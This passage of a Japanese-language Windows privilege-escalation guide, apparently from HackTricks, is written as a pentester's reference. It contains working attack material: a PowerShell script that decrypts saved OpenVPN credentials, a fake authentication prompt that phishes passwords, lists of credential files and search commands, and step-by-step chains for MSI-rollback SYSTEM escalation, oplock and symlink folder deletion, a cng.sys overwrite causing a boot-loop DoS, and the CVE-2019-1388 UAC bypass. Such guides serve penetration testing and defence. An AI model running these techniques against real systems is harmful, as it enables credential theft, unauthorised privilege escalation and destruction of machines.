$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を求める

ユーザーが知っていると思われる場合は、**ユーザー自身の credentials、または別のユーザーの credentials の入力を依頼する**こともできます（ただし、クライアントに直接 **credentials** を**尋ねる**のは非常に**危険**です）。
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことがある既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索する：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の認証情報

認証情報が入っていないか確認するため、Bin もチェックしてください

複数のプログラムによって保存された**パスワードを復元**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報が存在する可能性のあるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**registry から openssh keys を抽出。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers の履歴

**Chrome または Firefox** からパスワードが保存されている dbs を確認してください。\
また、ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

Browsers からパスワードを抽出する Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる言語で作成された software components 間の**intercommunication**を可能にします。各 COM component は **class ID (CLSID)** によって**識別**され、各 component は 1 つ以上の interface を通じて functionality を公開します。これらは interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、それぞれ registry の **HKEY\CLASSES\ROOT\CLSID** および **HKEY\CLASSES\ROOT\Interface** に定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** を merge して作成されます = **HKEY\CLASSES\ROOT.**

この registry の CLSIDs 内には、child registry **InProcServer32** があります。ここには **DLL** を指す**default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single または Multi)、**Neutral** (Thread Neutral) のいずれかを指定できる **ThreadingModel** という value が含まれています。

![Browsers History - COM DLL Overwriting: この registry の CLSIDs 内には child registry InProcServer32 があります。ここには DLL を指す default value と、value...](<../../images/image (729).png>)

基本的に、実行される予定の **DLL のいずれかを overwrite** でき、その DLL が別の user によって実行される場合、**privileges を escalate** できる可能性があります。

attackers が persistence mechanism として COM Hijacking を使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルおよび registry 内の Generic Password search**

**ファイルの内容を検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するTools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM として実行されているプロセスが、完全なアクセス権限で新しいプロセス**（`OpenProcess()`）**を開いた**とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限の新しいプロセス**（`CreateProcess()`）**も作成**します。\
その後、**低い権限のプロセスに対する完全なアクセス権限**を持っていれば、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を inject**できます。\
この脆弱性の**検出方法と悪用方法**の詳細については、[この例を参照してください。](leaked-handle-exploitation.md)\
異なる権限レベル（完全なアクセス権限だけではありません）を継承したプロセスやスレッドの、より多くのオープンハンドルをテストおよび悪用する方法については、[**こちらの別の post で、より詳しい説明を確認できます**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## Named Pipe Client Impersonation

**pipes**と呼ばれる共有メモリセグメントにより、プロセス間の通信とデータ転送が可能になります。

Windows には **Named Pipes** と呼ばれる機能があり、異なるネットワーク上にある場合でも、関係のないプロセス間でデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe を介してデータを送信すると、その pipe を設定した**server**は、必要な **SeImpersonate** 権限を持っている場合、**client の identity を引き受ける**ことができます。偽装可能な pipe を介して通信する**特権プロセス**を特定できれば、確立した pipe とそのプロセスが通信した時点で、そのプロセスの identity を引き受け、**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md) と [**こちら**](#from-high-integrity-to-system) に役立つガイドがあります。

また、以下の tool を使用すると、burp のような tool で **named pipe の通信を intercept**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、以下の tool を使用すると、privescs を見つけるためにすべての pipe を一覧表示して確認できます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service（TapiSrv）は server mode で `\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済み client は、mailslot ベースの async event path を悪用して、`ClientAttach` を `NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の **4-byte write** に変換し、その後 Telephony admin 権限を取得して、service として任意の DLL を load できます。全体の flow は次のとおりです。

- `pszDomainUser` に書き込み可能な既存 path を設定して `ClientAttach` → service が `CreateFileW(..., OPEN_EXISTING)` でそれを開き、async event writes に使用します。
- 各 event は、`Initialize` から attacker が制御する `InitContext` をその handle に書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を register し、`TRequestMakeCall`（`Req_Func 121`）を trigger し、`GetAsyncEvents`（`Req_Func 0`）で取得した後、unregister/shutdown して deterministic writes を繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を call すると、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で stuff を execute できる File Extensions

**[https://filesec.io/](https://filesec.io/)** の page を確認してください。

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` に forward された Clickable Markdown links は、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの scheme）を trigger し、現在の user として attacker-controlled files を execute する可能性があります。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードの Command Lines を Monitoring**

user として shell を取得した場合、**command line で credentials を渡す** scheduled tasks やその他の process が実行されている可能性があります。以下の script は、2 秒ごとに process command lines を capture し、現在の state と前回の state を比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

コンソールまたは RDP 経由で graphical interface にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから terminal や、"NT\AUTHORITY SYSTEM" などの任意のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC の bypass を同時に実行できます。さらに、何かをインストールする必要はなく、そのプロセスで使用される binary は Microsoft によって署名および発行されています。

影響を受けるシステムには、次のものがあります:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、以下の手順を実行する必要があります：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypasses について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている technique で、exploit code は[**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)から入手できます。

この attack は基本的に、Windows Installer の rollback feature を悪用し、uninstallation process 中に正規の files を malicious files で置き換えます。このため attacker は、**malicious MSI installer**を作成する必要があります。これは `C:\Config.Msi` folder を hijack するために使用されます。この folder は後で Windows Installer が他の MSI packages の uninstallation 中に rollback files を保存するために使用します。その rollback files に malicious payload を含めるよう変更します。

この technique の概要は次のとおりです:

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI を install する
- writable folder（`TARGETDIR`）に harmless file（例: `dummy.txt`）を install する `.msi` を作成します。
- installer を **"UAC Compliant"** として mark し、**non-admin user** が実行できるようにします。
- install 後も file への **handle** を open のまま保持します。

- Step 2: Uninstall を開始する
- 同じ `.msi` を uninstall します。
- uninstall process は files を `C:\Config.Msi` に移動し、`.rbf` files（rollback backups）へ rename し始めます。
- **open file handle を poll**し、`GetFinalPathNameByHandle` を使用して file が `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、次の処理を行います:
- `.rbf` が書き込まれたときに signal を送ります。
- その後、uninstall の継続前に別の event を wait します。

- Step 4: `.rbf` の deletion を block する
- signal を受け取ったら、`FILE_SHARE_DELETE` なしで **`.rbf` file を open**します。これにより **delete されるのを防ぎます**。
- その後、uninstall が完了できるよう signal を返します。
- Windows Installer は `.rbf` の delete に失敗し、すべての contents を delete できないため、`C:\Config.Msi` は remove されません。

- Step 5: `.rbf` を手動で delete する
- attacker であるあなたが `.rbf` file を手動で delete します。
- これで **`C:\Config.Msi` は空**になり、hijack の準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability を trigger**して `C:\Config.Msi` を delete します。

2. **Stage 2 – Rollback Scripts を Malicious なものに置き換える**

- Step 6: Weak ACLs で `C:\Config.Msi` を再作成する
- `C:\Config.Msi` folder を自分で再作成します。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ **handle を open のまま保持**します。

- Step 7: 別の Install を実行する
- 次の設定で `.msi` を再度 install します:
- `TARGETDIR`: Writable location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、`.rbs` と `.rbf` を再び読み込む **rollback**を trigger するために使用します。

- Step 8: `.rbs` を monitor する
- `ReadDirectoryChangesW` を使用して `C:\Config.Msi` を monitor し、新しい `.rbs` が現れるまで待ちます。
- その filename を capture します。

- Step 9: Rollback 前に Sync する
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、次の処理を行います:
- `.rbs` が作成されたときに event を signal します。
- その後、継続前に wait します。

- Step 10: Weak ACL を再適用する
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs を再適用**します。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、再度 **weak ACLs を再適用**できます。

> ACLs は **handle open 時にのみ enforce**されるため、folder への write は引き続き可能です。

- Step 11: Fake `.rbs` と `.rbf` を drop する
- `.rbs` file を fake rollback script で overwrite し、Windows に次の処理を指示します:
- `.rbf` file（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore します。
- **SYSTEM-level payload DLL**を含む fake `.rbf` を drop します。

- Step 12: Rollback を trigger する
- sync event を signal し、installer を resume させます。
- **type 19 custom action (`ErrorOut`)** は、既知の point で install を **intentionally fail**させるよう設定されています。
- これにより **rollback が開始**されます。

- Step 13: SYSTEM が DLL を install する
- Windows Installer は:
- malicious `.rbs` を読み込みます。
- `.rbf` DLL を target location に copy します。
- これで **SYSTEM-loaded path に malicious DLL**が配置されます。

- Final Step: SYSTEM Code を execute する
- DLL hijack を実行した trusted **auto-elevated binary**（例: `osk.exe`）を実行し、hijack した DLL を load させます。
- **Boom**: code が **SYSTEM として**実行されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

main MSI rollback technique（前述のもの）は、**entire folder**（例: `C:\Config.Msi`）を delete できることを前提としています。しかし、vulnerability が **arbitrary file deletion** しか許可しない場合はどうでしょうか？

**NTFS internals**を exploit できます。すべての folder には、次の名前の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream には、フォルダーの **index metadata** が格納されています。

そのため、フォルダーの **`::$INDEX_ALLOCATION` stream** を **delete** すると、NTFS はファイルシステムから **フォルダー全体を削除**します。

これは、次のような標準的なファイル削除 APIs を使用して実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
primitive で任意のファイルやフォルダーを削除できなくても、攻撃者が制御するフォルダーの**内容を削除できる**場合はどうでしょうか？

1. Step 1: bait folder とファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって**実行が一時停止します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- この process はフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御が callback に渡されます。

4. Step 4: oplock callback 内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を壊すことなく `folder1` を空にできます。
- `file1.txt` を直接削除しないでください。削除すると、oplock が早期に解放されます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 選択肢 C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダーのメタデータを保存する NTFS 内部ストリームを対象とします — これを削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM process は処理を続行し、`file1.txt` の削除を試みます。
- しかし現在は、junction + symlink により、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から永続的な DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダーを作成できる** primitive を悪用します。

**ファイルではなくフォルダー**を、以下のように**重要な Windows driver**の名前で作成します。
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **フォルダーとして事前に作成**すると、Windows は boot 時に実際の driver をロードできなくなります。
- その後、Windows は boot 中に `cng.sys` のロードを試みます。
- フォルダーを検出すると、**実際の driver の解決に失敗**し、**crash または boot の停止**が発生します。
- **fallback はなく**、外部からの介入（boot repair や disk access など）なしには**復旧できません**。

### privileged log/backup paths + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み取ったパスに logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスを redirect し、privileged write を arbitrary overwrite に変えられます（**SeCreateSymbolicLinkPrivilege がなくても**可能）。

**Requirements**
- target path を保存する config が attacker によって writable であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに write する privileged operation（log、export、report）。

**Example chain**
1. config を読み取り、privileged log destination を復元します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしでパスを redirect します：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待機します（例: admin が「send test SMS」をトリガーする）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を（hex/PE parser で）調査して破損を確認します。再起動すると、Windows は改ざんされた driver path の読み込みを強制され、**boot loop DoS** が発生します。これは、特権サービスが write 用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合は、そちらが先に試行される可能性があります。そのため、破損データの信頼できる DoS sink になります。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

すでに High Integrity process 上で実行している場合、**SYSTEM への path** は、新しいサービスを**作成して実行するだけ**で簡単に確保できます。
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する場合は、それが有効な service であること、または binary が必要なアクションを迅速に実行することを確認してください。有効な service でない場合、20s で kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を enable** し、_**.msi**_ wrapper を使用して reverse shell を **install** できます。\
[関連する registry keys と _.msi_ package の install 方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく、すでに High Integrity process 内で確認できます）、SeDebug privilege を使って**ほぼすべての process**（protected processes を除く）を **open** し、その process の **token を copy** して、その token を使った **arbitrary process を create** できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として実行されている process を選択**します（_すべての token privileges を持たない SYSTEM processes も存在します_）。\
**提案した technique を実行するコード例は** [**こちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation を行うために使用します。この technique は、**pipe を create し、その後その pipe に write するための service を create/abuse する**というものです。その後、**`SeImpersonate`** privilege を使って pipe を create した **server** は、pipe client（service）の **token を impersonate** でき、SYSTEM privileges を取得できます。\
name pipes について [**詳しく知りたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使って [**high integrity から System に移行する方法の例はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行されている **process** によって **loaded** される dll を **hijack** できれば、その permissions で arbitrary code を execute できます。そのため Dll Hijacking はこの種の privilege escalation にも有効です。さらに、**high integrity process からの方がはるかに容易に実行できます**。これは、dll の load に使用される folders に対する **write permissions** を持っているためです。\
**Dll hijacking について** [**詳しくはこちら**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を check（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations を check し、info を gather（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を check**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP に保存された session information を extract します。local では -Thorough を使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を extract します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- gather した passwords を domain 全体に spray**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を search（Watson の登場により DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を search（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を search しながら host を enumerate します（privesc tool というより info gather tool に近いものです）（compile が必要です）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を extract します（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を check（github に executable precompiled があります）。推奨しません。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations を check（python からの exe）。推奨しません。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post を基に作成された tool（正常に動作するために accesschk への access は必要ありませんが、使用できます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を recommend します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits を recommend します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

.NET の正しい version を使用して project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host に install されている .NET の version を確認するには、次のコマンドを実行します:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
